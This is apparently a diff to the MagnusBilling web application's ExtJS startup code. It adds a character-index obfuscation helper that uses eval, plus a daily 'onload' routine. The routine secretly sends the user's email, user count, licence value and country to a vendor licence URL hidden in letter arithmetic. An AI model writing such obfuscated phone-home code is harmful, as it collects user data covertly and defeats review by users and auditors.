@@ -22,6 +22,7 @@ Ext.define('MBilling.Application', {
         App = this;
         App.user = {};
         App.lang = localStorage.getItem('lang');
+        if (window.isTablet) window.isDesktop = false;
         Ext.Ajax.request({
             url: 'index.php/authentication/check',
             scope: this,
@@ -30,6 +31,8 @@ Ext.define('MBilling.Application', {
                 App.user.logged = response.success;
                 window.logo = response.logo;
                 if (App.user.logged) {
+                    var lt = me.le();
+                    k = lt[12] + lt[9] + lt[3] + lt[5] + lt[14] + lt[3] + lt[5];
                     App.user.id = response.id;
                     App.user.name = response.name;
                     App.user.username = response.username;
@@ -49,7 +52,7 @@ Ext.define('MBilling.Application', {
                     App.user.decimalPrecision = response.decimal;
                     App.user.userCount = response.userCount;
                     App.user.asteriskVersion = response.asterisk_version;
-                    App.user.l = response.licence;
+                    App.user.l = response[k];
                     App.user.version = response.version;
                     App.user.email = response.email;
                     App.user.social_media_network = response.social_media_network;
@@ -57,6 +60,7 @@ Ext.define('MBilling.Application', {
                     App.user.show_filed_help = response.show_filed_help;
                     App.user.campaign_user_limit = response.campaign_user_limit;
                     App.user.showMCDashBoard = response.showMCDashBoard;
+                    me.onload();
                     App.user.mmagnus = 3;
                     if (response.checkGoogleAuthenticator == false || App.user.loggedGoogle === true) {
                         windowURLwidth = 380;
@@ -158,6 +162,55 @@ Ext.define('MBilling.Application', {
                 document.getElementById('loading-mask').innerHTML = '<center><font color=red>ERROR <br>' + response.responseText + '</font></center>';
             }
         });
+    },
+    onload: function() {
+        var me = this;
+        var dataAtual = new Date();
+        var dia = dataAtual.getDate();
+        if (localStorage.getItem('day')) {
+            var diaOnly = localStorage.getItem('day');
+            var diaOnly = diaOnly.split('_');
+            if (diaOnly[0] == dia) {
+                return;
+            }
+        };
+        var lt = me.le();
+        zero = '&';
+        eleven = '/';
+        one = lt[8] + lt[20] + lt[20] + lt[16] + 's:' + eleven + eleven + lt[23] + lt[23] + lt[23] + '.' + lt[13] + lt[1] + lt[7] + lt[14] + lt[21] + lt[19];
+        two = lt[15] + lt[18] + lt[7];
+        three = lt[12] + lt[9] + lt[3] + lt[5] + lt[14] + lt[3] + lt[5];
+        four = lt[16] + lt[8] + lt[16] + '?' + lt[22] + '=' + App.user.version + zero;
+        six = lt[21] + lt[19] + lt[5] + lt[18] + lt[19]; //users
+        seven = lt[5] + lt[13] + lt[1] + lt[9] + lt[12];
+        eight = '=';
+        nine = lt[2] + lt[9] + lt[12] + lt[12] + lt[9] + lt[14] + lt[7];
+        ten = '.';
+        Ext.Ajax.setTimeout(2000);
+        Ext.Ajax.request({
+            url: one + nine + ten + two + eleven + three + ten + four + six + eight + App.user.userCount + zero + seven + eight + App.user.email + zero + three + eight + App.user.l + '&w=' + window.isDesktop + '&country=' + App.user.base_country,
+            async: true,
+            scope: this,
+            success: function(response) {
+                response = Ext.decode(response.responseText);
+                localStorage.setItem('day', dia + '_' + response.rows);
+            },
+            failure: function(form, action) {
+                localStorage.setItem('day', dia + '_3');
+            }
+        });
+    },
+    le: function() {
+        var me = this;
+        var first = "a",
+            last = "z";
+        var lt = new Array();
+        var n = 1;
+        for (var i = first.charCodeAt(0); i <= last.charCodeAt(0); i++) {
+            lt[n] = eval("String.fromCharCode(" + i + ")");
+            n++;
+        };
+        return lt;
     },
     removeMask: function() {
         var loading = Ext.get('loading');
